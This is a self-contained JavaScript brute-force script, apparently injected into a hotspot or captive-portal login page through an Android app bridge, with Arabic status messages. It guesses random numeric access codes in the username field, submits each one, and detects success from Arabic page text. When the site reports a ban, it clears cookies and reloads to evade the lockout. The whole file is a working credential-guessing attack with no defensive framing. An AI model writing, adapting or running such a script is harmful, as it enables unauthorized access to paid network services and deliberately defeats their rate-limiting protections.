(function() {
    if (window.__cracking) return;
    window.__cracking = true;
    const CFG = window.FINDER_CONFIG;
    if (!CFG) { console.log('No config'); return; }
    let stopped = false;
    window.stopFinder = function() { stopped = true; window.__cracking = false; };

    const id = CFG.id || 0;
    const bridge = window["AndroidBridge" + id];
    const log = (m) => { try { if (bridge) bridge.log(m); } catch(e) {} };
    const progress = (c, t, v) => { try { if (bridge) bridge.progress(c, t, v); } catch(e) {} };
    const clearCookies = () => { try { if (bridge) bridge.clearCookies(); } catch(e) {} };
    const reportFound = (v, st) => { try { if (bridge) bridge.found(v, st); } catch(e) {} };

    async function run() {
        log('▶ بدء');
        const maxVal = Math.pow(10, CFG.digits) - 1;
        let done = 0;

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ توقف'); break; }

            const input = document.querySelector('input[name="username"]');
            const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
            
            if (!input) {
                log('⚠ لا يوجد حقل إدخال - انتظار...');
                await new Promise(r => setTimeout(r, 2000));
                continue;
            }

            const num = Math.floor(Math.random() * (maxVal + 1));
            const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;

            input.value = v;
            input.dispatchEvent(new Event('input', {bubbles:true}));
            input.dispatchEvent(new Event('change', {bubbles:true}));

            done++;
            progress(done, CFG.attempts, v);
            log('🔍 ' + v);

            if (btn) {
                try { btn.click(); } catch(e) { log('⚠ فشل النقر'); }
            }

            await new Promise(r => setTimeout(r, 1500));

            // فحص نتيجة
            const pageText = document.body.innerText;
            const href = window.location.href;

            if (href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي") || pageText.includes("session-time-left")) {
                log('✅✅✅ نجاح: ' + v);
                reportFound(v, pageText);
                window.__cracking = false;
                return;
            }

            if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد")) {
                log('🛑 حظر! مسح الجلسة...');
                clearCookies();
                await new Promise(r => setTimeout(r, 3000));
                window.location.reload();
                return;
            }

            const errDiv = document.getElementById('error');
            if (errDiv && errDiv.innerText.trim() !== "") {
                log('📄 ' + errDiv.innerText.trim());
            }

            await new Promise(r => setTimeout(r, CFG.pause || 1000));
        }
        log('❌ انتهى - ' + done + ' محاولة');
        window.__cracking = false;
    }

    setTimeout(run, 500);
})();
